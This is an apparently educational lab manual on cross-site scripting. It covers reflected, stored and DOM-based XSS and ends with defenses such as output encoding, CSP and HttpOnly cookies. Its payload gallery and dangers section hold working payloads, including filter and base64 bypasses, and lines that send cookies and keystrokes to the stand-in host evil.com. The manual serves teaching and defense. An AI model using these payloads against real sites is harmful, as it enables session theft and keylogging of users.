# 💉 Lab Manual: XSS Cross-Site Scripting (When your browser trusts everyone)

### 0. Preface
In the world of the Web, the browser is like an overly trusting executor. Whatever code you give it, it runs—even if that code was smuggled in through a suspicious input field.

*   **XSS (Cross-Site Scripting)**: An attack that allows attackers to execute malicious scripts in a victim's browser.
*   **Why XSS and not CSS?**: Because CSS was already taken by Cascading Style Sheets, so we had to use X for Cross instead.

The goal of this chapter is simple: **Make the browser execute JavaScript that it really shouldn't.**

---

### 1. Reflected XSS: The Mirror That Bites Back

**The Concept**:
When user input is "reflected" back by the server onto the page without proper encoding, malicious scripts have an opportunity to strike.

**Classic Scenario**:
```
Search box input: <script>alert('XSS')</script>
Page displays: You searched for: <script>alert('XSS')</script>
Browser: Okay, let me execute this code...
```

**Fun Fact**:
Reflected XSS requires tricking users into clicking a crafted link to trigger, so it's often combined with social engineering. Those "Click here to claim your million-dollar prize" links? They might be hiding exactly this.

**Pro-Tip**:
See something weird like `<script>` or `javascript:` in a URL? Don't click. Seriously, just don't.

---

### 2. Stored XSS: The Ticking Time Bomb

**The Concept**:
When malicious scripts are stored on the server (e.g., in a database), they execute every time a user visits the page containing that script. It's like planting a bomb in a public place—everyone who walks by gets hit.

**Attack Script**:
1. Attacker posts a "comment" on a guestbook: `<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>`
2. The comment gets stored in the database
3. When other users view the guestbook, the script loads and executes
4. Users' cookies are silently sent to the attacker's server

**Core Philosophy**:
You think you're reading comments, but actually, the comments are "reading" your cookies.

---

### 3. DOM-based XSS: Frontend Does It to Itself

**The Concept**:
This XSS happens entirely on the browser side—the server doesn't even know what's going on. When JavaScript code unsafely handles user input (like directly inserting content with `innerHTML`), the attack occurs.

**Dangerous Code Example**:
```javascript
// Get parameter from URL
const name = new URLSearchParams(location.search).get('name');
// Directly insert into DOM — Dangerous!
document.getElementById('greeting').innerHTML = 'Welcome, ' + name;
```

If the URL is `?name=<img src=x onerror=alert('XSS')>`, congratulations—you just triggered XSS.

**The Irony**:
Server-side did perfect protection? No worries, the frontend can mess everything up on its own.

---

### 4. XSS Payload Gallery

**Beginner Level**:
```html
<script>alert('XSS')</script>
```

**Intermediate Level** (Bypassing simple filters):
```html
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
```

**Advanced Techniques** (Encoding bypass):
```html
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
<!-- atob decodes base64, actually executes alert('XSS') -->
```

**Master Level** (Using event handlers):
```html
<div onmouseover="alert('XSS')">Hover over me</div>
<input onfocus=alert('XSS') autofocus>
```

---

### 5. XSS Dangers: More Than Just Pop-ups

Many people think XSS is just about popping an `alert()` box—that's just "proof of concept." Real attacks can:

**Steal Cookies**:
```javascript
new Image().src = "http://evil.com/steal?cookie=" + document.cookie;
```

**Keylogging**:
```javascript
document.onkeypress = function(e) {
    new Image().src = "http://evil.com/log?key=" + e.key;
}
```

**Page Defacement**:
```javascript
document.body.innerHTML = '<h1>This site has been hacked</h1>';
```

**Phishing**:
```javascript
// Display a fake login form to steal user credentials
```

---

### 6. Defense Measures Overview

**Input Filtering**:
- Whitelist is better than blacklist
- But don't rely solely on frontend filtering

**Output Encoding**:
- HTML entity encoding: `<` → `&lt;`
- JavaScript encoding: `'` → `\x27`
- URL encoding: `<` → `%3C`

**Content Security Policy (CSP)**:
```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```
This tells the browser: only execute scripts from this site, don't trust anything else.

**HttpOnly Cookies**:
```http
Set-Cookie: session=abc123; HttpOnly
```
JavaScript cannot access cookies with the HttpOnly flag.

---

### 7. Conclusion

The essence of XSS is "breaking the trust boundary"—the browser trusts what the server returns, but the server failed to properly sanitize user input.

Remember: **Never trust user input, and always encode your output.**

Now, go try your skills in the lab. If you manage to pop an `alert()`, you've got the basics. But if you can steal your own cookies, that's when you've truly started.

---

**[Ready? Let the injection begin]**
